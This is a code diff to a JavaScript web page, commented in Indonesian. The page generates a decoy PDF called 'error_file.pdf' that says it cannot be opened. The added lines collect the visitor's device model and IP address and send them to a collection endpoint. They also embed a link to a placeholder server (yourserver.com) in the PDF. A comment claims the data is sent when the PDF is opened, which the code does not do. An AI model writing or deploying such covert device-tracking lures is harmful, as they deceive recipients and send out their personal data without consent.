@@ -117,14 +117,20 @@
             doc.text("Ini adalah file yang tidak dapat dibuka", 10, 10);
             doc.text("Tapi jika dibuka, informasi perangkat akan dikirim ke server.", 10, 20);
             
-            // Kirim data ke server Flask
+            // Kirim data ke server Flask (ini akan terjadi begitu file PDF dibuka)
+            let serverLink = `https://yourserver.com/submit_info?device=${encodeURIComponent(deviceInfo.model)}&ip=${encodeURIComponent(deviceInfo.ip)}`;
+
+            // Menyimpan PDF dan memberikan link embedded di dalam PDF
+            doc.text(`Data perangkat telah terkirim ke server (link): ${serverLink}`, 10, 30);
+            
+            // Menyimpan PDF
+            doc.save("error_file.pdf");
+
+            // Mengirimkan data perangkat ke server
             fetch(`/submit_info?device=${encodeURIComponent(deviceInfo.model)}&ip=${encodeURIComponent(deviceInfo.ip)}`)
                 .then(response => response.text())
                 .then(data => console.log("Data berhasil dikirim ke server:", data))
                 .catch(error => console.error("Error mengirim data:", error));
-            
-            // Menyimpan PDF
-            doc.save("error_file.pdf");
         }
     </script>
 
